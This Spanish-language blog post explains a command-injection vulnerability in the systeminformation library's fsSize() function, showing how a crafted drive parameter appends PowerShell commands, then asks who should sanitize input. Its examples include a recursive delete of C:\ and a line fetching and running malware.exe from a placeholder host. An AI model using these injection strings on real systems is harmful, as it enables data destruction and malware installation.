---
title: "¿Qué puede salir mal? (I)"
author: "Patricio Moracho"
date: 2025-12-18
post_date: 2025-12-18
layout: post
categories: cat
excerpt_separator: <!--more-->
published: true
show_meta: true
comments: true
mathjax: false
gistembed: false
noindex: false
hide_printmsg: false
sitemap: true
summaryfeed: false
description: Sobre la fragilidad de los sistemas de software y las mil y una forma en que los desarrolladores pueden meter la pata.
tags:
  - desarrollo
  - seguridad
output:
  github_page:
    jekyllthat::jekylldown
  pdf_document: default
  html_document:
    df_print: paged
---

Recién salido del horno, este [CVE] nos sirve para divagar un poco sobre la
fragilidad de los sistemas de software y particularmente, sobre nosotros los
desarrolladores y las mil y una forma en que podemos meter la pata.

Contexto: una libreria popular en el ecosistema de JavaScript,
[systeminformation], que provee información del sistema operativo y hardware.
Una función, `fsSize()`, que obtiene información sobre los sistemas de archivos
montados, particularmente su tamaño, espacio usado y libre. Y en esta función:

![codesnapshot.png]({{site.baseurl}}/images/2025/codesnapshot.png)

Nada a raro, ¿no? Un simple llamado a un comando del sistema operativo
mediante PowerShell para obtener la información necesaria. Pero, veamos de
traducir esto en el comando PS final:

```powershell
PS C:\Users\Administrator> get-WmiObject Win32_logicaldisk | select Access,Caption,FileSystem,FreeSpace,Size | where -property Caption -eq c: | fl

Access     : 0
Caption    : C:
FileSystem : NTFS
FreeSpace  : 43160854528
Size       : 53562306560
```

Veamos la firma de la función que ejecuta el código en cuestión:

```typescript
function fsSize(drive, callback) { }
```

¿Y que pasa si logramos manipular el parámetro `drive` para que en lugar de `c:`, le
pasemos algo así como `c: ; Write-Host "La cagamos!"`?


```powershell
get-WmiObject Win32_logicaldisk | select Access,Caption,FileSystem,FreeSpace,Size | where -property Caption -eq c: ; Write-Host "La cagamos!" | fl

Access     : 0
Caption    : C:
FileSystem : NTFS
FreeSpace  : 42635722752
Size       : 53562306560

La cagamos!
```

Y ahí lo tienen, un clásico caso de inyección de comandos, imaginemos para
dejarlo más claro, algo como esto:

```powershell
c: ; Remove-Item -Path C:\* -Recurse -Force
```
o bien:

```powershell
c: ;Download-File -Url http://malicious.site/malware.exe -OutFile
C:\malware.exe ; Start-Process C:\malware.exe
```

Creo que ya se entiende la idea. Llegamos a un lugar dónde fácilmente podemos
ejecutar casi cualquier comando de forma remota, con los privilegios que tiene
en este caso `Node.js` en el sistema operativo anfitrión, que como mínimo suelen
ser algo más elevados.

La moraleja fácil y rápida, sería: **nunca, pero nunca, confiar en la entrada
del usuario**. Pero creo que hay mucha mas "tela para cortar" en este asunto.

## Algunas preguntas disruptivas

* ¿Debería Sebastian Hildebrandt (autor de la librería) haber sanitizado el
  parámetro `drive`?
* Soy del principio clasico de que una función haga bien solo un cosa, en lo
  posible de forma clara, concreta, eficiente y si se puede, elegante. ¿Por que
  debería preocuparme de problemas por fuera del alcance del requerimiento que
  busca resolver la función?
* ¿Es correcto que una librería de software ejecute un shell command para
  averiguar una información puntual?
* ¿Como desarrollador que consume esta librería, no debería haber sanitizado el
  parámetro `drive` antes de pasarlo a la función `fsSize()`?
* ¿A los gritos invocamos el principio de minima responsabilidad de la función
  cuando se usa un shell command, pero no nos preocupa cuando exigimos a la
  función una sanitización de los parámetros de entrada?
* ¿Deberíamos depender menos de librerías de terceros para funciones tan
  puntuales como esta?

Mas adelante, buscaré responderme estas preguntas y otras que surjan en el
camino.


[CVE]: https://nvd.nist.gov/vuln/detail/CVE-2025-68154
[systeminformation]: https://github.com/sebhildebrandt/systeminformation
  